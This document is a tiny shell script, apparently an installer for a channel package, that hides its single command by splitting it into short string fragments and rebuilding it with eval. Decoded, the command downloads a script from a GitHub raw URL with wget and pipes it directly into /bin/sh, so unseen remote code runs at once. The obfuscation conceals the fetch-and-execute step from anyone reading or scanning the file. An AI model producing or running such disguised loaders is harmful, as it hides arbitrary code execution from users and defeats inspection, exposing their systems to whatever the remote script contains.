z="
";Xz='| /b';Kz='mil2';Wz='O - ';Fz='hubu';Uz='er.s';Cz='ps:/';Gz='serc';Vz='h -q';Ez='.git';Yz='in/s';Rz='main';Dz='/raw';Sz='/ins';Qz='aad/';Bz=' htt';Iz='nt.c';Mz='hann';Hz='onte';Zz='h';Lz='37/c';Az='wget';Oz='oham';Tz='tall';Nz='el-m';Pz='ed-s';Jz='om/e';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz"